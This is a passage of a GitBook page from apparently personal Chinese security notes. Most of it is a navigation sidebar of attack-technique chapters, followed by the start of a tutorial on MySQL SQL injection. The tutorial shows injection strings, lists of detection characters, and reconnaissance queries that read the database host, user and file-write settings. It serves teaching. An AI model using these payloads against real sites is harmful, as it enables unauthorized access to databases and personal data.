+                <a href="../../../../03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html">
+            
+                    
+                    JAVA反序列化之CC1--LazyMap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.1.2" data-path="../../../../03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html">
+            
+                <a href="../../../../03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html">
+            
+                    
+                    Java反序列化之CC1-TransFormed
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.1.3" data-path="../../../../03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html">
+            
+                <a href="../../../../03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html">
+            
+                    
+                    Java反序列化之URLDNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.2" data-path="../../../../03.代码审计/JAVA/04.反序列化/FastJson.html">
+            
+                <a href="../../../../03.代码审计/JAVA/04.反序列化/FastJson.html">
+            
+                    
+                    Fastjson漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.3" data-path="../../../../03.代码审计/JAVA/04.反序列化/JNDI.html">
+            
+                <a href="../../../../03.代码审计/JAVA/04.反序列化/JNDI.html">
+            
+                    
+                    JNDI注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.5" data-path="../../../../03.代码审计/JAVA/Java-Thymeleaf模板注入.html">
+            
+                <a href="../../../../03.代码审计/JAVA/Java-Thymeleaf模板注入.html">
+            
+                    
+                    Thymeleaf 模板注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.6" data-path="../../../../03.代码审计/JAVA/JavaAttack.html">
+            
+                <a href="../../../../03.代码审计/JAVA/JavaAttack.html">
+            
+                    
+                    Java Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7" data-path="../../../../03.代码审计/JAVA/Java代审--常见漏洞函数.html">
+            
+                <a href="../../../../03.代码审计/JAVA/Java代审--常见漏洞函数.html">
+            
+                    
+                    Java代码审计--常见漏洞函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.1" data-path="../../../../03.代码审计/PHP/phpinfo.html">
+            
+                <a href="../../../../03.代码审计/PHP/phpinfo.html">
+            
+                    
+                    phpinfo中的信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.2" data-path="../../../../03.代码审计/PHP/PHP代码审计.html">
+            
+                <a href="../../../../03.代码审计/PHP/PHP代码审计.html">
+            
+                    
+                    PHP代码审计
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.3" data-path="../../../../03.代码审计/PHP/php代码审计基础.html">
+            
+                <a href="../../../../03.代码审计/PHP/php代码审计基础.html">
+            
+                    
+                    PHP代码审计基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.4" data-path="../../../../03.代码审计/PHP/php反序列化.html">
+            
+                <a href="../../../../03.代码审计/PHP/php反序列化.html">
+            
+                    
+                    PHP反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../../../../03.代码审计/python反序列化.html">
+            
+                <a href="../../../../03.代码审计/python反序列化.html">
+            
+                    
+                    Python反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    04.工具使用
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../../../04.工具使用/00.注意.html">
+            
+                <a href="../../../../04.工具使用/00.注意.html">
+            
+                    
+                    00.注意
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../../../04.工具使用/01.Cobal%20Strike.md">
+            
+                <span>
+            
+                    
+                    01.Cobal Strike
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../../../04.工具使用/02.MSF.html">
+            
+                <a href="../../../../04.工具使用/02.MSF.html">
+            
+                    
+                    02.MSF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../../../../04.工具使用/03.抓包工具.html">
+            
+                <a href="../../../../04.工具使用/03.抓包工具.html">
+            
+                    
+                    03.抓包工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../../../../04.工具使用/04.gogo.html">
+            
+                <a href="../../../../04.工具使用/04.gogo.html">
+            
+                    
+                    04.gogo
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../../../../04.工具使用/05.辅助工具.html">
+            
+                <a href="../../../../04.工具使用/05.辅助工具.html">
+            
+                    
+                    05.辅助工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    05.编程开发
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" >
+            
+                <span>
+            
+                    
+                    Python
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1.1" data-path="../../../../05.编程开发/Python/POC模板.html">
+            
+                <a href="../../../../05.编程开发/Python/POC模板.html">
+            
+                    
+                    POC编写
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.1.2" data-path="../../../../05.编程开发/Python/python命名空间.html">
+            
+                <a href="../../../../05.编程开发/Python/python命名空间.html">
+            
+                    
+                    python命名空间
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.1.3" data-path="../../../../05.编程开发/Python/python技巧.html">
+            
+                <a href="../../../../05.编程开发/Python/python技巧.html">
+            
+                    
+                    python技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" >
+            
+                <span>
+            
+                    
+                    工具原理
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.2.1" data-path="../../../../05.编程开发/工具原理/sqlmap.html">
+            
+                <a href="../../../../05.编程开发/工具原理/sqlmap.html">
+            
+                    
+                    Sqlmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../../../../05.编程开发/Nginx.html">
+            
+                <a href="../../../../05.编程开发/Nginx.html">
+            
+                    
+                    Nginx
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    06.WriteUp
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" >
+            
+                <span>
+            
+                    
+                    CTF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1.1" data-path="../../../../06.WriteUp/CTF/2022安洵杯.html">
+            
+                <a href="../../../../06.WriteUp/CTF/2022安洵杯.html">
+            
+                    
+                    2022 安洵杯
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.2" data-path="../../../../06.WriteUp/CTF/bugku应急响应.html">
+            
+                <a href="../../../../06.WriteUp/CTF/bugku应急响应.html">
+            
+                    
+                    bugku 应急响应
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.3" data-path="../../../../06.WriteUp/CTF/BUU.md">
+            
+                <span>
+            
+                    
+                    BUUCTF刷题合集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.4" data-path="../../../../06.WriteUp/CTF/HNCTF.html">
+            
+                <a href="../../../../06.WriteUp/CTF/HNCTF.html">
+            
+                    
+                    HNCTF 2022
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.5" data-path="../../../../06.WriteUp/CTF/misc.html">
+            
+                <a href="../../../../06.WriteUp/CTF/misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.6" data-path="../../../../06.WriteUp/CTF/NewstarCTF.html">
+            
+                <a href="../../../../06.WriteUp/CTF/NewstarCTF.html">
+            
+                    
+                    New Star CTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.7" data-path="../../../../06.WriteUp/CTF/NodeJs.html">
+            
+                <a href="../../../../06.WriteUp/CTF/NodeJs.html">
+            
+                    
+                    NodeJs相关
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.8" data-path="../../../../06.WriteUp/CTF/NSSRound5.html">
+            
+                <a href="../../../../06.WriteUp/CTF/NSSRound5.html">
+            
+                    
+                    NSS Round 5
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.9" data-path="../../../../06.WriteUp/CTF/NSSRound6.html">
+            
+                <a href="../../../../06.WriteUp/CTF/NSSRound6.html">
+            
+                    
+                    NSS Round 6
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.10" data-path="../../../../06.WriteUp/CTF/环境变量注入.html">
+            
+                <a href="../../../../06.WriteUp/CTF/环境变量注入.html">
+            
+                    
+                    环境变量注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" >
+            
+                <span>
+            
+                    
+                    靶机
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.2.1" data-path="../../../../06.WriteUp/靶机/HackTheBox--Alert.html">
+            
+                <a href="../../../../06.WriteUp/靶机/HackTheBox--Alert.html">
+            
+                    
+                    Hack The Box Alert
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.2" data-path="../../../../06.WriteUp/靶机/Vulnhub-blue系列.html">
+            
+                <a href="../../../../06.WriteUp/靶机/Vulnhub-blue系列.html">
+            
+                    
+                    Vulnhub--blue系列
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.3" data-path="../../../../06.WriteUp/靶机/Vulnhub-DC系列.html">
+            
+                <a href="../../../../06.WriteUp/靶机/Vulnhub-DC系列.html">
+            
+                    
+                    Vulnhub--DC系列
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.4" data-path="../../../../06.WriteUp/靶机/红日靶场1.html">
+            
+                <a href="../../../../06.WriteUp/靶机/红日靶场1.html">
+            
+                    
+                    红日靶场1
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    07.基础知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1.1" data-path="../../../../07.基础知识/Linux/linux-shell.html">
+            
+                <a href="../../../../07.基础知识/Linux/linux-shell.html">
+            
+                    
+                    《Linux命令行与shell脚本编程大全》 笔记
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.1.2" data-path="../../../../07.基础知识/Linux/Linux命令.html">
+            
+                <a href="../../../../07.基础知识/Linux/Linux命令.html">
+            
+                    
+                    Linux常用命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.1.3" data-path="../../../../07.基础知识/Linux/Linux命令本质.html">
+            
+                <a href="../../../../07.基础知识/Linux/Linux命令本质.html">
+            
+                    
+                    Linux命令本质
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" >
+            
+                <span>
+            
+                    
+                    Windows
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.2.1" data-path="../../../../07.基础知识/Windows/windows基本操作.html">
+            
+                <a href="../../../../07.基础知识/Windows/windows基本操作.html">
+            
+                    
+                    windows基本操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" >
+            
+                <span>
+            
+                    
+                    计算机网络
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.3.1" data-path="../../../../07.基础知识/计算机网络/ARP协议.html">
+            
+                <a href="../../../../07.基础知识/计算机网络/ARP协议.html">
+            
+                    
+                    ARP协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.2" data-path="../../../../07.基础知识/计算机网络/DNS协议.html">
+            
+                <a href="../../../../07.基础知识/计算机网络/DNS协议.html">
+            
+                    
+                    DNS协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.3" data-path="../../../../07.基础知识/计算机网络/湖科大mooc.html">
+            
+                <a href="../../../../07.基础知识/计算机网络/湖科大mooc.html">
+            
+                    
+                    计算机网络MOOC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.4" data-path="../../../../07.基础知识/计算机网络/虚拟机网络.html">
+            
+                <a href="../../../../07.基础知识/计算机网络/虚拟机网络.html">
+            
+                    
+                    虚拟机网络
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../../../../07.基础知识/tombkeeper关于信息安全学习的分享.html">
+            
+                <a href="../../../../07.基础知识/tombkeeper关于信息安全学习的分享.html">
+            
+                    
+                    tombkeeper关于信息安全学习的分享
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../../../../07.基础知识/名词解释.html">
+            
+                <a href="../../../../07.基础知识/名词解释.html">
+            
+                    
+                    常见名词与概念
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../../../../07.基础知识/渗透测试和红队的区别.html">
+            
+                <a href="../../../../07.基础知识/渗透测试和红队的区别.html">
+            
+                    
+                    转载--渗透测试和红队的区别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../../../../07.基础知识/编码.html">
+            
+                <a href="../../../../07.基础知识/编码.html">
+            
+                    
+                    编码
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" >
+            
+                <span>
+            
+                    
+                    08.杂七杂八
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../../../../08.杂七杂八/个人信息保护.html">
+            
+                <a href="../../../../08.杂七杂八/个人信息保护.html">
+            
+                    
+                    个人信息保护
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../../../../08.杂七杂八/华为安装谷歌.html">
+            
+                <a href="../../../../08.杂七杂八/华为安装谷歌.html">
+            
+                    
+                    华为安装谷歌
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../../../../08.杂七杂八/安全方向.html">
+            
+                <a href="../../../../08.杂七杂八/安全方向.html">
+            
+                    
+                    安全方向
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.4" data-path="../../../../08.杂七杂八/手机VPN共享.html">
+            
+                <a href="../../../../08.杂七杂八/手机VPN共享.html">
+            
+                    
+                    手机VPN共享
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.5" data-path="../../../../08.杂七杂八/换内存条.html">
+            
+                <a href="../../../../08.杂七杂八/换内存条.html">
+            
+                    
+                    如何更换内存条
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.6" data-path="../../../../08.杂七杂八/面试记录.html">
+            
+                <a href="../../../../08.杂七杂八/面试记录.html">
+            
+                    
+                    笔/面记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+        </nav>
+        
+        
+    </div>
+
+    <!-- Content nav -->
+    <div class="book-anchor">
+        <div class="book-anchor-title">ON THIS PAGE</div>
+        <div class="book-anchor-body">
+
+        </div>
+    </div>
+
+    <div class="book-body">
+        
+        <div class="body-inner">
+            
+            
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../../.." >Sql注入详解--Mysql</a>
+    </h1>
+</div>
+
+
+
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                    
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                    <section class="normal markdown-section">
+                        
+                        <h1 id="&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;">&#x6F0F;&#x6D1E;&#x4ECB;&#x7ECD;</h1>
+<p>Sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x662F;&#x6307;&#x670D;&#x52A1;&#x5668;&#x5728;&#x5904;&#x7406;Sql&#x8BED;&#x53E5;&#x65F6;<strong>&#x9519;&#x8BEF;&#x5730;&#x62FC;&#x63A5;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x7684;&#x53C2;&#x6570;</strong>&#xFF0C;<strong>&#x6253;&#x7834;&#x4E86;&#x539F;&#x6709;&#x7684;Sql&#x6267;&#x884C;&#x903B;&#x8F91;</strong>&#xFF0C;&#x5BFC;&#x81F4;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x90E8;&#x5206;&#x6216;&#x5B8C;&#x5168;<strong>&#x638C;&#x63E1;Sql&#x8BED;&#x53E5;&#x6267;&#x884C;&#x6548;&#x679C;</strong>&#x7684;&#x4E00;&#x7C7B;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x3002;</p>
+<p>&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;</p>
+<p>&#x5047;&#x8BBE;&#x540E;&#x7AEF;Sql&#x4EE3;&#x7801;</p>
+<pre class="language-"><code class="lang-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;select * from users where id=&apos;<span class="token interpolation"><span class="token variable">$id</span></span>&apos;;&quot;</span>
+</code></pre>
+<p>&#x7528;&#x6237;&#x63D0;&#x4EA4;</p>
+<pre class="language-"><code class="lang-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>&apos; <span class="token keyword">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
+</code></pre>
+<p>&#x62FC;&#x63A5;&#x540E;&#x7684;sql&#x8BED;&#x53E5;</p>
+<pre class="language-"><code class="lang-mysql">select * from users where id=&apos;1&apos; and 1=1 #&apos;
+</code></pre>
+<p><code>1&apos;</code>&#x5C06;&#x7B2C;&#x4E00;&#x4E2A;<code>&apos;</code>&#x95ED;&#x5408;&#xFF0C;<code>#</code>&#x5C06;&#x7B2C;&#x4E8C;&#x4E2A;<code>&apos;</code>&#x6CE8;&#x91CA;&#x6389;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x8FDB;&#x884C;&#x6CE8;&#x5165;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5C06;<code>and 1=1</code>&#x90E8;&#x5206;&#x66FF;&#x6362;&#x4E3A;&#x5176;&#x4ED6;sql&#x8BED;&#x53E5;&#x5373;&#x53EF;&#x3002;</p>
+<blockquote>
+<p>&#x5176;&#x5B9E;&#x5206;&#x6790;<code>sqlmap</code>&#x7684;&#x6CE8;&#x5165;&#x4E5F;&#x662F;&#x5982;&#x6B64;&#xFF0C;&#x6CE8;&#x5165;&#x8BED;&#x53E5;&#x7531;<code>prefix</code>&#xFF0C;<code>payload</code>&#x548C;<code>suffix</code>&#x7EC4;&#x6210;</p>
+</blockquote>
+<p>&#x56FE;&#x6765;&#x6E90;<a href="https://www.freebuf.com/column/161797.html" target="_blank">https://www.freebuf.com/column/161797.html</a></p>
+<p><img src="../../../../images/image-20230522131723064.png" alt="image-20230522131723064"></p>
+<h1 id="&#x6F0F;&#x6D1E;&#x5371;&#x5BB3;">&#x6F0F;&#x6D1E;&#x5371;&#x5BB3;</h1>
+<ul>
+<li><p>&#x83B7;&#x5F97;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x624B;&#x673A;&#x53F7;&#xFF0C;&#x8EAB;&#x4EFD;&#x8BC1;&#xFF0C;&#x90AE;&#x7BB1;&#xFF0C;&#x5BB6;&#x5EAD;&#x5730;&#x5740;&#x7B49;</p>
+</li>
+<li><p>&#x83B7;&#x5F97;&#x7F51;&#x7AD9;&#x540E;&#x53F0;&#x8D26;&#x53F7;</p>
+<pre class="language-"><code>&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#xFF1F;&#xFF08;&#x8FD9;&#x5E74;&#x5934;&#x8FD8;&#x6709;&#x5417;&#x1F914;&#xFF0C;&#x8FD8;&#x662F;&#x6709;&#x7684;&#x3002;&#x3002;&#xFF09;
+&#x62FF;&#x5230;&#x5BC6;&#x7801;&#xFF0C;&#x901A;&#x5E38;&#x9700;&#x8981;&#x9006;&#x5411;&#x89E3;&#x5BC6;&#x6216;&#x8005;&#x5F69;&#x8679;&#x8868;&#x7834;&#x89E3;
+&#x901A;&#x8FC7;sql&#x8BED;&#x53E5;&#x521B;&#x5EFA;&#x540E;&#x53F0;&#x8D26;&#x53F7;
+</code></pre></li>
+<li><p>&#x4EFB;&#x610F;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;</p>
+</li>
+<li><p>Getshell</p>
+</li>
+<li><p>&#x63D0;&#x6743;</p>
+</li>
+</ul>
+<h1 id="&#x5982;&#x4F55;&#x6316;&#x6398;">&#x5982;&#x4F55;&#x6316;&#x6398;</h1>
+<p><strong>&#x4E00;&#x5207;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x6709;&#x4EA4;&#x4E92;&#x7684;&#x5730;&#x65B9;</strong>&#x90FD;&#x53EF;&#x80FD;&#x662F;<strong>&#x6CE8;&#x5165;&#x70B9;</strong>&#xFF0C;&#x53D6;&#x51B3;&#x4E8E;&#x540E;&#x7AEF;&#x4ECE;HTTP&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x4E2D;&#x63D0;&#x53D6;&#x4E86;&#x4EC0;&#x4E48;&#x6570;&#x636E;&#x5E76;&#x62FC;&#x63A5;&#x5230;sql&#x8BED;&#x53E5;&#x4E2D;</p>
+<p><strong>&#x662F;&#x5426;&#x5B58;&#x5728;sql&#x6CE8;&#x5165;</strong></p>
+<p>&#x5224;&#x65AD;&#x95ED;&#x5408;&#x7C7B;&#x578B;&#xFF0C;&#x901A;&#x5E38;&#x4F7F;&#x7528;&#x62A5;&#x9519;&#xFF0C;&#x5E03;&#x5C14;&#xFF0C;&#x5EF6;&#x65F6;&#xFF0C;&#x6570;&#x5B66;&#x8FD0;&#x7B97;&#x7B49;&#x624B;&#x6CD5;&#x6765;&#x68C0;&#x6D4B;</p>
+<pre class="language-"><code>&apos;
+&quot;
+\
++1&#xFF0C;-1
+&#x62A5;&#x9519;&#x51FD;&#x6570;
+&#x5EF6;&#x65F6;&#x51FD;&#x6570;
+</code></pre><p><a href="https://blog.csdn.net/qq_39997096/article/details/109764488" target="_blank">&#x5B9E;&#x6218;&#x4E2D;SQL&#x6CE8;&#x5165;&#x6700;&#x5BB9;&#x6613;&#x51FA;&#x73B0;&#x7684;&#x5730;&#x65B9;_&#x53EA;&#x6709;&#x9009;&#x62E9;&#x6846;&#x548C;&#x65E5;&#x671F;&#x6846;,&#x4F1A;&#x51FA;&#x73B0;sql&#x6CE8;&#x5165;&#x60C5;&#x51B5;&#x5417;-CSDN&#x535A;&#x5BA2;</a></p>
+<h1 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;">&#x6F0F;&#x6D1E;&#x5229;&#x7528;</h1>
+<h2 id="&#x4FE1;&#x606F;&#x6536;&#x96C6;">&#x4FE1;&#x606F;&#x6536;&#x96C6;</h2>
+<p><img src="../../../../images/image-20230522131900429.png" alt="image-20230522131900429"></p>
+<h3 id="&#x7AD9;&#x5E93;&#x5206;&#x79BB;">&#x7AD9;&#x5E93;&#x5206;&#x79BB;</h3>
+<blockquote>
+<p>Web&#x7AD9;&#x70B9;&#x548C;&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x4E3B;&#x673A;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x5E93;&#x5BF9;Web&#x7AD9;&#x70B9;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;</p>
+</blockquote>
+<p><strong>&#x653B;&#x51FB;&#x624B;&#x6CD5;</strong></p>
+<ul>
+<li>&#x8BFB;&#x53D6;&#x8D26;&#x5BC6;&#xFF0C;&#x8F6C;&#x5230;web&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6253;</li>
+<li>&#x4FE1;&#x606F;&#x6536;&#x96C6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x662F;&#x5426;&#x5728;&#x5185;&#x7F51;&#x4E2D;</li>
+</ul>
+<p><strong>&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x7684;&#x5224;&#x65AD;&#x65B9;&#x6CD5;</strong></p>
+<ul>
+<li><p>&#x901A;&#x7528;&#x65B9;&#x6CD5;</p>
+<p>&#x8BFB;&#x53D6;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5224;&#x65AD;IP</p>
+</li>
+<li><p>Mysql</p>
+<pre class="language-"><code class="lang-mysql">select @@hostname; //&#x670D;&#x52A1;&#x7AEF;&#x4E3B;&#x673A;&#x540D;&#x79F0; 
+select * from information_schema.PROCESSLIST; //&#x5BA2;&#x6237;&#x7AEF;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#x548C;&#x7AEF;&#x53E3;
+</code></pre>
+<blockquote>
+<p>Windows&#x8FDE;&#x63A5;&#x683C;&#x5F0F;&#xFF1A;&#x4E3B;&#x673A;&#x540D;:Port</p>
+<p>Linux&#x8FDE;&#x63A5;&#x683C;&#x5F0F;&#xFF1A;IP:Port</p>
+<p>&#x672C;&#x5730;&#x8FDE;&#x63A5;&#x683C;&#x5F0F;&#xFF1A;localhost:Port</p>
+</blockquote>
+<p><img src="../../../../images/image-20230522203905326.png" alt="image-20230522203905326"></p>
+<pre class="language-"><code>select user();
+</code></pre><blockquote>
+<p>&#x5982;&#x679C;&#x4E0D;&#x662F;localhost&#xFF0C;&#x5927;&#x6982;&#x7387;&#x662F;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x3002;</p>
+</blockquote>
+<p>  <img src="../../../../images/image-20230522204233420.png" alt="image-20230522204233420"></p>
+</li>
+</ul>
+<h3 id="&#x6570;&#x636E;&#x5E93;&#x7C7B;&#x578B;">&#x6570;&#x636E;&#x5E93;&#x7C7B;&#x578B;</h3>
+<p><img src="../../../../images/image-20230519205623244-1685603526750.png" alt=""></p>
+<h3 id="&#x5404;&#x79CD;&#x4FE1;&#x606F;">&#x5404;&#x79CD;&#x4FE1;&#x606F;</h3>
+<pre class="language-"><code class="lang-mysql"># ifnull(@@secure_file_priv,0) secure_file_priv&#x4E3A;&#x7A7A;&#x65F6;&#x8FD4;&#x56DE;0,&#x4E0D;&#x4E3A;&#x7A7A;&#x65F6;&#x8FD4;&#x56DE;&#x5176;&#x503C;
+SELECT concat_ws(0x0a,
+ifnull(@@secure_file_priv,0),
+concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),
+concat_ws(0xefbc8c, @@hostname, @@port),
+concat_ws(0xefbc8c, user(), database()),
+concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)
+)
+
+
+# &#x7ED3;&#x679C;
+0
+10.5.8-MariaDB-3&#xFF0C;debian-linux-gnu&#xFF0C;x86_64&#xFF0C;Debian buildd-unstable
+kali&#xFF0C;3306
+root@localhost
+/var/lib/mysql/&#xFF0C;/usr/lib/mysql/plugin/&#xFF0C;/tmp&#xFF0C;/usr
+</code></pre>
+<pre class="language-"><code class="lang-mysql"># &#x5F97;&#x5230;&#x540E;&#x7AEF;&#x6267;&#x884C;&#x7684;sql&#x8BED;&#x53E5;
